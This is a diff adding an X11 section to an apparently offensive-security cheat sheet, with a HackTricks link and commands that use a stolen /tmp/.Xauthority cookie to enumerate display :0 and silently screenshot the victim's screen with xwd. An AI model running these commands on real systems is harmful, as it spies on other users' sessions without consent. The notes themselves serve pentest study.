@@ -206,3 +206,27 @@ curl http://localhost -o output.txt
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>X11(.Xauthority)</strong></summary>
+
+- https://book.hacktricks.wiki/en/network-services-pentesting/6000-pentesting-x11.html#screenshots-capturing
+
+```bash
+w
+```
+<img width="1103" height="103" alt="image" src="https://github.com/user-attachments/assets/9d532428-0519-4278-99f3-938062dc0a00" />
+
+<br>
+<br>
+
+```bash
+XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0
+
+XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0
+
+XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > screenshot.xwd
+```
+
+</details>
